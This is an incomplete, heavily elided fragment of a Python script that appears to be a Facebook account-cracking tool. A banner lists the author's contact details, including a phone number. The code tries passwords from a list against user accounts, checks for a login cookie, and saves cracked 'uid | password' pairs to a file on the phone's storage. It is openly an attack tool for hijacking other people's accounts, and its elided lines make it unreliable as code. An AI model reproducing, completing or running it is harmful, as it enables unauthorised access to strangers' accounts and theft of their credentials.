...
|___|___||__|\_||__|    |__|\_||__|__||__|    \__,_|
 \033[1;32m  ╔════════════════════════════════════╗
 \033[1;32m  ║😈[•] Facebook : MD Sabbir Hossain Rafi😴      
\033[1;32m   ║😈[•] Whatsapp : +8801982876336     
 \033[1;32m  ║😈[•] Github    : tera-baf-007
 \033[1;32m  ║😈[•] Status    : FREE            
  \033[1;32m ║😈[•] Network   : 3G, 4G/5G ON     
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            #created by hbf team(owners) Rafu & Ety
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                ok.append(uid)
                    ...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;91mSUCCESFUL\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
                    open('/sdcard/ok.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[RAFU] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
#---------------------[END MENU]---------------------#
